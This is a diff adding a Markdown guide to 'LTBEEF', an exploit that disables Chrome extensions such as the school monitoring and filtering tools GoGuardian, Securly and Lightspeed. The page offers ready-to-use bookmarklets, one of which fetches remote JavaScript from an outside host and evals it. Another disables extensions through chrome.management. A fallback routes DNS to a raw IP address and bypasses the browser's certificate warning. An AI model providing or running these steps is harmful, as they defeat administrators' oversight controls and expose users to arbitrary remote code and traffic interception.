@@ -1,0 +1,46 @@
+---
+title: "LTBEEF - Disable ANY Extension"
+slug: "LTBEEF_-_Disable_ANY_Extension"
+description: "Disables any extension"
+---
+
+# LTBEEF - Disable ANY Extension
+
+LTBEEF is an incredibly powerful exploit which can be utilized to disable any extension, including GoGuardian, Securly, Lightspeed, ....
+
+Credits to Bypassi and CompactCow.
+
+## Bookmarklets
+
+**Option A - GUI Based**
+
+```js
+javascript: fetch("https://compactcow.com/ltbeef/exploit.js").then((data) => {
+  data.text().then((text) => {
+    eval(text);
+  });
+});
+```
+
+Click it once (not on a new tab) to get to the correct webstore page, then again to open the UX.
+
+**Option B - if Option A doesn't load**
+
+- Go to https://chrome.google.com/webstorex and run this bookmarklet
+
+```js
+javascript: prompt("Extension IDs here: (seperated by commas)")
+  .split(",")
+  .forEach((i) => {
+    chrome.management.setEnabled(i.trim(), !1);
+  });
+```
+
+## If bookmarklets are disabled:
+
+- Set your DNS to the following:
+  `129.213.138.223`
+- Visit chrome://restart
+- Visit https://chrome.google.com/
+- You should see a warning. Click on the warning symbol (⚠️) and type thisisunsafe.
+- You should see a simple interface which lets you enable and disable your extensions.
